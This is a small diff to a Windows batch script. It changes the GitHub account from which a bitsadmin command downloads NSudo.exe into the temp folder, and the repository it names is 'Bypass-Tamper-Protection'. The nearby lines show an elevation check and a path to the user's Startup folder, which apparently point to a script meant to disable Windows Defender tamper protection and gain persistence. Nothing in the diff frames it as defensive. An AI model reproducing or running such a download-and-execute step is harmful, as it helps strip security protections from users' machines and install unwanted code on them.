@@ -18,7 +18,7 @@ if '%errorlevel%' NEQ '0' (
 :main
 cd %temp%
 
-bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
+bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/TaintedSights/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
 set startup = %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
